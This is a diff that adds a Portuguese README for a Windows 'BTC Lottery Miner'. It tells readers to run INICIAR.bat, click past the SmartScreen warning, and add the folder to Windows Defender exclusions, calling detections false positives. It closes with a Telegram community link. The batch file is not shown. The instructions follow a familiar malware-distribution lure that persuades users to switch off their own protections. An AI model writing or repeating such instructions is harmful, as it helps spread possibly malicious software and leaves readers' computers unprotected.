@@ -1,0 +1,25 @@
+=====================================================
+    BTC LOTTERY MINER — PASSO A PASSO WINDOWS
+=====================================================
+
+1. Dê DUPLO CLIQUE no arquivo "INICIAR.bat" nesta pasta.
+2. Se o Windows exibir aviso azul (SmartScreen):
+   → Clique em "Mais informações"
+   → Clique em "Executar assim mesmo"
+3. O painel abrirá automaticamente no navegador (http://localhost:3500).
+4. Clique em "CONFIGURAR CARTEIRA", cole seu endereço Bitcoin e salve.
+5. Clique em "GIRAR A ROLETA (INICIAR)".
+
+-----------------------------------------------------
+⚠️  AVISO DE ANTIVÍRUS (WINDOWS DEFENDER):
+-----------------------------------------------------
+Mineradores de Bitcoin são rotulados como "falso-positivo".
+Se o Windows Defender bloquear o arquivo, adicione esta pasta
+nas Exceções do Windows Defender:
+1. Abra "Segurança do Windows"
+2. Vá em "Proteção contra vírus e ameaças" → "Exclusões"
+3. Clique em "Adicionar uma exclusão" → Selecione esta pasta.
+
+-----------------------------------------------------
+  Comunidade Telegram: https://t.me/BilheteDoBloco
+=====================================================
